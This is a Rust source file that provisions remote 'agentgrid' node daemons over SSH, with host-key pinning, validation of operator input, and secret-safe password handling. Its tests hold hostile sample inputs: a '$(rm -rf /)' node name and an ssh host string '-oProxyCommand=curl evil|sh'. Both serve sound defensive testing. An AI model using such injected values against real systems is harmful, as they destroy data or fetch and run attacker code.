//! Provisioning a remote host as an agentgrid node over SSH.
//!
//! This lives in its own crate because two callers do the same dangerous thing:
//! `ag nodes install` (an operator's laptop) and `POST /v1/nodes/install` (the
//! control plane, behind an opt-in flag). Duplicating the path would mean two
//! places to get host-key policy, argv construction and the credential file
//! wrong, and the threat model credits this code with failing closed on an
//! unknown host key — so there is exactly one implementation.
//!
//! What it does, in order: validate the operator-supplied strings, verify (or
//! pin) the SSH host key, copy `agentgrid-node-daemon` over scp, either open a
//! reverse tunnel or point the node at a server URL, write a `0600` env file
//! with a one-shot enrollment token, and start the daemon detached.
//!
//! What it deliberately is not: a configuration-management system. There is no
//! idempotency beyond `mkdir -p` + overwrite, no rollback, and no supervision
//! (no systemd unit — `deploy/install-node.sh` is the durable path). The token
//! is minted by the caller and handed in, so this crate never talks HTTP.

use anyhow::{Context, Result};
use std::path::PathBuf;

/// SSH connection parameters.
///
/// `password` is a secret. It travels to the child process through the
/// environment (`SSHPASS`, or `AGENTGRID_SSH_PASS` for the `expect` fallback),
/// never argv, and this crate never formats it into a log line.
#[derive(Clone, Debug, Default)]
pub struct Target {
    /// `user@host` or `user@host:port`.
    pub host: String,
    /// Path to a private key, on the machine running this code.
    pub ssh_key: Option<String>,
    /// Password auth. Needs `sshpass` or `expect` on the machine running this.
    pub password: Option<String>,
    /// Accept an unknown host key on first connect (like `ssh-keyscan`).
    /// Off by default: an unknown key is refused, so a MITM cannot hijack the
    /// bootstrap and the enrollment token with it.
    pub accept_new_host_key: bool,
    /// Pin the exact SHA256 fingerprint. Overrides `accept_new_host_key`.
    pub host_key_fingerprint: Option<String>,
}

/// How the node reaches the control plane afterwards.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Transport {
    /// `ssh -R <remote_port>:127.0.0.1:<local_port>`: the node dials its own
    /// localhost, and the SSH client that opened the tunnel forwards it to
    /// **the machine running this code**. That machine must therefore reach the
    /// control plane on `local_port`. Nothing supervises the tunnel, so it is a
    /// bootstrap convenience, not a production link.
    SshTunnel,
    /// The node dials `Plan::server` itself — a control plane address or a peer
    /// node's relay (`AGENTGRID_RELAY_LISTEN`). SSH is used only to bootstrap.
    Direct,
}

/// Everything the remote env file is built from, plus where the binary comes
/// from. Kept separate from `Target` so the control plane can accept a JSON
/// body and the CLI a clap struct, and both land here.
#[derive(Clone, Debug)]
pub struct Plan {
    pub transport: Transport,
    pub name: String,
    pub repositories: String,
    pub adapters: String,
    pub max_concurrency: u32,
    pub data_dir: String,
    /// Required by `Transport::Direct`, ignored by `SshTunnel`.
    pub server: Option<String>,
    pub agent_version: String,
    /// Never set implicitly: the daemon refuses to run as root, and the
    /// operator must say so out loud.
    pub allow_root: bool,
    pub local_port: u16,
    pub remote_port: u16,
    /// Local path to `agentgrid-node-daemon` (or a copy of it).
    pub binary: PathBuf,
}

/// What the caller can report afterwards.
#[derive(Debug)]
pub struct Outcome {
    /// The `AGENTGRID_SERVER` baked into the remote env file.
    pub server_url: String,
    /// `ssh-tunnel` or `direct/https`, for a human-readable summary.
    pub transport: &'static str,
    /// Where the binary landed on the remote.
    pub remote_bin: String,
}

/// Provision `p` on `t`, using `token` as the one-shot enrollment credential.
///
/// `log` receives one short line per completed step; the control plane appends
/// them to the install job so the UI can show progress, the CLI prints them.
pub fn install(t: &Target, p: &Plan, token: &str, log: &mut dyn FnMut(&str)) -> Result<Outcome> {
    validate(t, p)?;
    log(&format!("verifying SSH host key of {}", host_only(&t.host)));
    // Hardening P0 (safe node install): the key is verified BEFORE any remote
    // command runs, so a MITM cannot receive the token or the binary.
    verify_host_key(t)?;

    let data = p.data_dir.trim_end_matches('/');
    let remote_bin = format!("{data}/agentgrid-node");

    log(&format!("creating {data} on the remote"));
    run_remote(
        t,
        false,
        &[],
        Some(format!("mkdir -p {data}")),
        "prepare remote dir",
        false,
    )?;

    log(&format!("copying {}", file_name(&p.binary)));
    scp_file(t, &p.binary.to_string_lossy(), &remote_bin)?;

    let (server_url, transport) = match p.transport {
        Transport::Direct => {
            let server = p
                .server
                .clone()
                .context("Transport::Direct needs a server URL")?;
            (server, "direct/https")
        }
        Transport::SshTunnel => {
            log(&format!(
                "opening reverse tunnel :{} -> 127.0.0.1:{}",
                p.remote_port, p.local_port
            ));
            run_remote(
                t,
                false,
                &[
                    "-f".into(),
                    "-N".into(),
                    "-R".into(),
                    format!("{}:127.0.0.1:{}", p.remote_port, p.local_port),
                ],
                None,
                "establish reverse tunnel",
                true,
            )?;
            (format!("http://127.0.0.1:{}", p.remote_port), "ssh-tunnel")
        }
    };

    log("writing the environment file (0600)");
    let env = env_file(p, token, &server_url);
    let tmp = std::env::temp_dir().join(format!("ag-env-{}.env", std::process::id()));
    std::fs::write(&tmp, env).context("write local env temp")?;
    scp_file(t, &tmp.to_string_lossy(), &format!("{data}/agentgrid.env"))?;
    let _ = std::fs::remove_file(&tmp);

    // Source the env file in a shell so the single-quoted values (and the `*`
    // in AGENTGRID_REPOSITORIES) are parsed correctly; `env $(cat file)` would
    // keep the literal quotes and glob the `*`.
    log("starting the node daemon");
    let start = format!(
        "mkdir -p {data} && chmod 600 {data}/agentgrid.env && setsid nohup bash -c 'set -a; . {data}/agentgrid.env; set +a; exec {bin}' >{data}/node.log 2>&1 </dev/null &",
        data = data,
        bin = remote_bin,
    );
    // The start command backgrounds itself on the remote; launch the ssh that
    // delivers it detached so it does not block (and survives our exit).
    run_remote(t, false, &[], Some(start), "start node", true)?;

    Ok(Outcome {
        server_url,
        transport,
        remote_bin,
    })
}

/// Build the remote env file (single-quoted values, safe for `. env`).
pub fn env_file(p: &Plan, token: &str, server: &str) -> String {
    let data = p.data_dir.trim_end_matches('/');
    let mut s = format!(
        "AGENTGRID_SERVER='{server}'\nAGENTGRID_ENROLL_TOKEN='{token}'\nAGENTGRID_NODE_NAME='{name}'\nAGENTGRID_REPOSITORIES='{repos}'\nAGENTGRID_ADAPTERS='{adapters}'\nAGENTGRID_MAX_CONCURRENCY='{mc}'\nAGENTGRID_DATA_DIR='{data}'\n",
        server = server,
        token = token,
        name = p.name,
        repos = p.repositories,
        adapters = p.adapters,
        mc = p.max_concurrency,
        data = data,
    );
    // The node daemon refuses to run as root unless AGENTGRID_ALLOW_ROOT=1. We
    // never set it automatically; the operator must ask for it explicitly.
    if p.allow_root {
        s.push_str("AGENTGRID_ALLOW_ROOT='1'\n");
    }
    s.push_str(&format!("AGENTGRID_AGENT_VERSION='{}'\n", p.agent_version));
    s
}

/// Reject shell-breaking characters in operator-supplied fields (trust
/// boundary: these strings end up inside a remote `bash -c`).
pub fn validate(t: &Target, p: &Plan) -> Result<()> {
    let sane = |s: &str, what: &str| {
        if s.chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_./@:,*".contains(c))
        {
            Ok(())
        } else {
            anyhow::bail!("invalid {what}: only [A-Za-z0-9._,/@:-] allowed")
        }
    };
    sane(&p.name, "name")?;
    sane(&p.repositories, "repositories")?;
    sane(&p.adapters, "adapters")?;
    sane(&p.data_dir, "data-dir")?;
    if let Some(s) = &p.server {
        sane(s, "server")?;
    }
    // The SSH target is interpolated into argv, not a shell, but a newline or a
    // leading `-` (which ssh reads as an option) is still not a host. Colons
    // and brackets stay legal so `user@[::1]:2222` keeps working.
    let (user, host, _port) = parse_host(&t.host);
    for part in user.iter().chain(std::iter::once(&host)) {
        let ok = !part.is_empty()
            && !part.starts_with('-')
            && part
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || "-_.:[]%".contains(c));
        if !ok {
            anyhow::bail!("invalid ssh host {:?}", t.host);
        }
    }
    if p.transport == Transport::Direct && p.server.is_none() {
        anyhow::bail!("direct transport needs a server URL");
    }
    Ok(())
}

/// `user@host[:port]` -> `(user, host, port)`.
pub fn parse_host(host: &str) -> (Option<String>, String, Option<u16>) {
    let (user, rest) = match host.split_once('@') {
        Some((u, r)) => (Some(u.to_string()), r),
        None => (None, host),
    };
    match rest.rsplit_once(':') {
        Some((h, p)) if p.parse::<u16>().is_ok() => (user, h.to_string(), p.parse().ok()),
        _ => (user, rest.to_string(), None),
    }
}

fn host_only(host: &str) -> String {
    parse_host(host).1
}

fn file_name(p: &std::path::Path) -> String {
    p.file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| p.to_string_lossy().into_owned())
}

/// Verify or pin the remote SSH host key before anything is copied.
fn verify_host_key(t: &Target) -> Result<()> {
    let (_user, host, port) = parse_host(&t.host);
    if let Some(fp) = &t.host_key_fingerprint {
        let fp = fp.trim();
        let mut scan = std::process::Command::new("ssh-keyscan");
        scan.stderr(std::process::Stdio::null());
        if let Some(p) = port {
            scan.arg("-p").arg(p.to_string());
        }
        scan.arg(&host);
        let scan_out = scan
            .output()
            .with_context(|| format!("ssh-keyscan {host} failed to spawn"))?;
        if !scan_out.status.success() || scan_out.stdout.is_empty() {
            anyhow::bail!("could not ssh-keyscan host {host}: not reachable or no keys");
        }
        let mut kg = std::process::Command::new("ssh-keygen");
        kg.arg("-lf").arg("-");
        kg.stdin(std::process::Stdio::piped());
        kg.stdout(std::process::Stdio::piped());
        kg.stderr(std::process::Stdio::null());
        let mut child = kg
            .spawn()
            .with_context(|| "ssh-keygen -lf - failed to spawn")?;
        use std::io::Write;
        child.stdin.take().unwrap().write_all(&scan_out.stdout).ok();
        let kg_out = child
            .wait_with_output()
            .with_context(|| "ssh-keygen -lf - wait failed")?;
        let text = String::from_utf8_lossy(&kg_out.stdout);
        let mut matched = false;
        for line in text.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 && parts[1].eq_ignore_ascii_case(fp) {
                matched = true;
                break;
            }
        }
        if !matched {
            anyhow::bail!(
                "host {host} SSH key fingerprint does not match the pinned fingerprint; got:\n{text}"
            );
        }
        // Add the trusted key to known_hosts so subsequent ssh uses strict.
        let home = home_dir()?;
        let kh_path = home.join(".ssh/known_hosts");
        if let Some(parent) = kh_path.parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        let mut kh = std::process::Command::new("ssh-keyscan");
        kh.stderr(std::process::Stdio::null());
        if let Some(p) = port {
            kh.arg("-p").arg(p.to_string());
        }
        kh.arg("-H").arg(&host);
        let out = kh.output().with_context(|| "ssh-keyscan -H failed")?;
        if out.status.success() && !out.stdout.is_empty() {
            use std::io::Write;
            let mut f = std::fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(&kh_path)?;
            f.write_all(&out.stdout)?;
        }
    }
    Ok(())
}

fn home_dir() -> Result<PathBuf> {
    if let Ok(h) = std::env::var("HOME") {
        if !h.is_empty() {
            return Ok(PathBuf::from(h));
        }
    }
    anyhow::bail!("HOME unset: cannot resolve ~/.ssh/known_hosts for SSH host-key pinning")
}

/// Run ssh/scp against the remote, choosing the auth wrapper: key (direct),
/// password via `sshpass` when present, else `expect`.
///
/// `extra` are program-specific args (e.g. `-f -N -R ...`); `remote_cmd` (ssh
/// only) is the final argument. `detach` starts the command in its own session
/// so it survives this process — used for the tunnel and for the node start.
fn run_remote(
    t: &Target,
    is_scp: bool,
    extra: &[String],
    remote_cmd: Option<String>,
    what: &str,
    detach: bool,
) -> Result<()> {
    let prog = if is_scp { "scp" } else { "ssh" };
    let mut base: Vec<String> = vec![prog.to_string()];
    if let Some(key) = &t.ssh_key {
        base.push("-i".into());
        base.push(key.clone());
    }
    base.push("-o".into());
    // Fail CLOSED on an unknown host key by default (no MITM).
    if t.host_key_fingerprint.is_some() {
        base.push("StrictHostKeyChecking=yes".into());
    } else if t.accept_new_host_key {
        base.push("StrictHostKeyChecking=accept-new".into());
    } else {
        base.push("StrictHostKeyChecking=yes".into());
    }
    // A host that never answers would otherwise hold the caller (and an install
    // job) for the kernel's TCP timeout. Ten seconds is enough for a LAN or a
    // reachable WAN host, and turns "hung" into "failed".
    base.push("-o".into());
    base.push("ConnectTimeout=10".into());
    if !is_scp && t.password.is_none() {
        base.push("-o".into());
        base.push("BatchMode=yes".into());
    }
    if let (.., Some(p)) = parse_host(&t.host) {
        base.push((if is_scp { "-P" } else { "-p" }).into());
        base.push(p.to_string());
    }
    base.extend(extra.iter().cloned());
    let (user, host, _p) = parse_host(&t.host);
    let target = user
        .map(|u| format!("{u}@{host}"))
        .unwrap_or_else(|| host.clone());
    if !is_scp {
        base.push(target);
        if let Some(rc) = &remote_cmd {
            base.push(rc.clone());
        }
    }

    // auth wrapper -> final argv (+ optional secret passed via env, never argv)
    let (argv, secret_env) = if let Some(pw) = &t.password {
        if std::process::Command::new("sshpass")
            .arg("true")
            .status()
            .is_ok()
        {
            let mut v = vec!["sshpass".to_string(), "-e".to_string()];
            v.extend(base);
            (v, Some(("SSHPASS", pw.clone())))
        } else {
            let spawn_line = format!(
                "spawn {}",
                base.iter()
                    .map(|x| format!("{{{x}}}"))
                    .collect::<Vec<_>>()
                    .join(" ")
            );
            // The password is read from AGENTGRID_SSH_PASS at expect runtime:
            // interpolating it into the script would expose it in `ps` (argv)
            // and allow Tcl injection through the password text.
            let script = format!(
                "set timeout 600\n{spawn_line}\nexpect {{\n    -re \"(?i)password:\" {{ send \"$env(AGENTGRID_SSH_PASS)\\r\"; exp_continue }}\n    eof\n}}\n"
            );
            (
                vec!["expect".to_string(), "-c".to_string(), script],
                Some(("AGENTGRID_SSH_PASS", pw.clone())),
            )
        }
    } else {
        (base, None)
    };

    if detach {
        let mut c = std::process::Command::new("setsid");
        c.arg("nohup").args(&argv);
        if let Some((var, val)) = &secret_env {
            c.env(var, val);
        }
        // Detached children must NOT inherit our stdio — the caller would
        // otherwise hang on a pipe the detached ssh keeps open.
        c.stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .with_context(|| format!("failed to spawn detached ssh/scp ({what})"))?;
        return Ok(());
    }
    let mut c = std::process::Command::new(&argv[0]);
    c.args(&argv[1..]);
    if let Some((var, val)) = &secret_env {
        c.env(var, val);
    }
    let status = c
        .status()
        .with_context(|| format!("failed to run ssh/scp ({what})"))?;
    if !status.success() {
        anyhow::bail!("ssh/scp step failed ({what}): exit {status}");
    }
    Ok(())
}

/// Copy a local file to the remote host.
fn scp_file(t: &Target, local: &str, remote: &str) -> Result<()> {
    let (user, host, _p) = parse_host(&t.host);
    let target = format!(
        "{}:{}",
        user.map(|u| format!("{u}@{host}"))
            .unwrap_or_else(|| host.clone()),
        remote
    );
    run_remote(
        t,
        true,
        &[local.to_string(), target],
        None,
        "scp file",
        false,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn plan() -> Plan {
        Plan {
            transport: Transport::SshTunnel,
            name: "node-b".into(),
            repositories: "*".into(),
            adapters: "mock".into(),
            max_concurrency: 2,
            data_dir: "/var/lib/agentgrid".into(),
            server: None,
            agent_version: "0.1.0-cli".into(),
            allow_root: false,
            local_port: 7800,
            remote_port: 7800,
            binary: PathBuf::from("/usr/local/bin/agentgrid-node-daemon"),
        }
    }

    fn target() -> Target {
        Target {
            host: "deploy@node-b:2222".into(),
            ..Default::default()
        }
    }

    #[test]
    fn parse_host_splits_user_port() {
        assert_eq!(
            parse_host("u@h:22"),
            (Some("u".into()), "h".into(), Some(22))
        );
        assert_eq!(parse_host("h:2222"), (None, "h".into(), Some(2222)));
        assert_eq!(parse_host("u@h"), (Some("u".into()), "h".into(), None));
        assert_eq!(parse_host("h"), (None, "h".into(), None));
    }

    #[test]
    fn env_file_has_server_and_token() {
        let env = env_file(&plan(), "TOK123", "http://cp.example.com:7800");
        assert!(env.contains("AGENTGRID_SERVER='http://cp.example.com:7800'"));
        assert!(env.contains("AGENTGRID_ENROLL_TOKEN='TOK123'"));
        assert!(env.contains("AGENTGRID_NODE_NAME='node-b'"));
        // single-quoted values survive `. env`
        assert!(env.lines().all(|l| l.contains('=')));
    }

    #[test]
    fn validate_rejects_shell_meta() {
        let mut p = plan();
        p.name = "$(rm -rf /)".into();
        assert!(validate(&target(), &p).is_err());
        let mut b = plan();
        b.repositories = "a; b".into();
        assert!(validate(&target(), &b).is_err());
        assert!(validate(&target(), &plan()).is_ok());
    }

    /// The SSH target is not shell-interpolated, but a leading `-` would be
    /// read by `ssh` as an option and a newline has no business being in a
    /// hostname either.
    #[test]
    fn validate_rejects_option_injection_in_host() {
        let p = plan();
        let t = Target {
            host: "-oProxyCommand=curl evil|sh".into(),
            ..Default::default()
        };
        assert!(validate(&t, &p).is_err());
        let t = Target {
            host: "user@host\nother".into(),
            ..Default::default()
        };
        assert!(validate(&t, &p).is_err());
    }

    /// An IPv6 literal must survive the new host check: `ag nodes install`
    /// accepted `user@[::1]:2222` before this crate existed and the check is
    /// only here to keep argv sane, not to narrow what ssh can address.
    #[test]
    fn validate_accepts_ipv6_literal() {
        let t = Target {
            host: "deploy@[::1]:2222".into(),
            ..Default::default()
        };
        assert_eq!(parse_host(&t.host).1, "[::1]");
        assert!(validate(&t, &plan()).is_ok());
    }

    /// The default env does NOT bake `AGENTGRID_ALLOW_ROOT=1` — the daemon
    /// refuses root unless the operator explicitly opts in.
    #[test]
    fn env_file_no_allow_root_by_default() {
        let p = plan();
        assert!(!p.allow_root);
        let env = env_file(&p, "tok", "http://127.0.0.1:7800");
        assert!(
            !env.contains("AGENTGRID_ALLOW_ROOT"),
            "default env must not allow root: {env}"
        );
        assert!(env.contains("AGENTGRID_ENROLL_TOKEN='tok'"));
    }

    #[test]
    fn env_file_adds_allow_root_when_opted_in() {
        let mut p = plan();
        p.allow_root = true;
        let env = env_file(&p, "tok", "http://127.0.0.1:7800");
        assert!(env.contains("AGENTGRID_ALLOW_ROOT='1'"));
    }

    /// `Transport::Direct` without a URL cannot build an env file, and the
    /// control plane's install path is Direct-only — reject it before any ssh
    /// child is spawned, not halfway through a half-written install.
    #[test]
    fn direct_transport_needs_a_server() {
        let mut p = plan();
        p.transport = Transport::Direct;
        assert!(validate(&target(), &p).is_err());
        p.server = Some("http://cp.example.com:7800".into());
        assert!(validate(&target(), &p).is_ok());
    }

    /// Host-key fingerprint and accept-new are both off by default, so SSH
    /// fails closed on an unknown host key.
    #[test]
    fn host_key_mode_defaults_strict() {
        let t = Target::default();
        assert!(!t.accept_new_host_key);
        assert!(t.host_key_fingerprint.is_none());
    }
}
